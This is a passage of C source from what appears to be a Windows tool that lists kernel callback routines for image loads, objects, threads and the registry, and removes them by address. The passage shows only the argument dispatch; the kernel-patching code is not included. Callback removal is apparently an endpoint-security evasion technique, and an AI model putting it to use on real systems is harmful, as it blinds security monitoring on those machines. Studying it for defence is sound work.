        findimgcallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "obj") == 0) {

        findobjcallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "thread") == 0) {
        
        findthreadcallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "delthread") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        findthreadcallbackroutine((DWORD64)remove);
    }
    else if (strcmp(argv[1] + 1, "delimg") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        findimgcallbackroutine((DWORD64)remove);
    }
    else if (strcmp(argv[1] + 1, "delobj") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        findobjcallbackroutine((DWORD64)remove);
    }
    else if (strcmp(argv[1] + 1, "reg") == 0) {
        
        findregistrycallbackroutines(NULL);
    }
    else {
        wprintf(L"Error: Check the help\n");

    }


    return 0;
}
